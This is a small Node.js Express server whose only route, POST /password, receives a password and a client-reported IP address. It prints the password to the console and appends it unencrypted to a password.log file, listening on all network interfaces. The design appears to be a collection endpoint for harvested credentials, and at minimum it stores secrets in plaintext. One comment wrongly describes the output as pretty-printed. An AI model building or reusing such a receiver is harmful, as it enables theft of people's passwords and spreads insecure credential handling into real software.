const express = require('express');
const fs = require('fs');
const app = express();

// JSON 형식의 요청 본문을 해석하는 미들웨어
app.use(express.json());
app.use(express.urlencoded({ extended: true }));


app.post('/password', (req, res) => {
    let password = req.body.password; // PassWord Data load
    let ip = req.body.ip 

    console.log(password)
    console.log(req.body);
    const logEntry = {
        timestamp: new Date().toISOString(),
        ip: ip,
        password: password 
    };

    const logEntryJSON = JSON.stringify(logEntry)+"\n"; // Serialize to JSON with pretty-printing

    fs.appendFile('password.log', logEntryJSON, (err) => { 
        if (err) {
            console.error('Error writing to log file', err);
            res.status(500).send({ result: false }); 
        } else {
            console.log("success");
            res.send({ result: true }); 
        }
    });
});

const PORT = 3000;
app.listen(PORT, '0.0.0.0', () => { 
    console.log(`Server is running on http://localhost:${PORT}`);
});